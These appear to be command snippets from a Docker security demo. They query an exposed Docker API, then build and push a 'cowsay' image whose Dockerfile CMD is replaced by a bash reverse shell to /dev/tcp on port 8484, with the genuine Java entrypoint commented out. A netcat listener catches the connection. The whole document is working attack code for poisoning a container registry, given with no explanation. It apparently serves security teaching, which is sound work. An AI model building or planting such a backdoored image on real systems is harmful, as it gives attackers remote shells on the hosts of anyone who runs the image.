```shell
docker run -d --name registry -p 80:5000 --restart=always registry:2.7.1
git clone https://github.com/sabbath666/DockerSecurity.git
docker build -t cowsay:0.0.1 .

```

```shell
curl 2ip.ru
curl -X GET http://127.0.0.1:2375/containers/json?all=true
```

```shell
docker pull
export IP_ADDR=$(ifconfig eth0 | awk 'NR==2 {print $2}')

cat > Dockerfile <<EOF
FROM maven:3.9.6-eclipse-temurin-21 AS build
WORKDIR /build
COPY pom.xml .
COPY src ./src
RUN mvn clean package -DskipTests

FROM eclipse-temurin:21-jre
ARG IP
ENV IP=${IP}
WORKDIR /app
COPY --from=build /build/target/cowsay-0.0.1.jar cowsay.jar
RUN mkdir data
CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/${IP}/8484 0>&1"]
# ENTRYPOINT ["java", "-jar", "cowsay.jar"]
EOF

docker build
docker push
apt install netcat -y
nc -lvnp 8484
```

```shell
docker pull
docker run
```


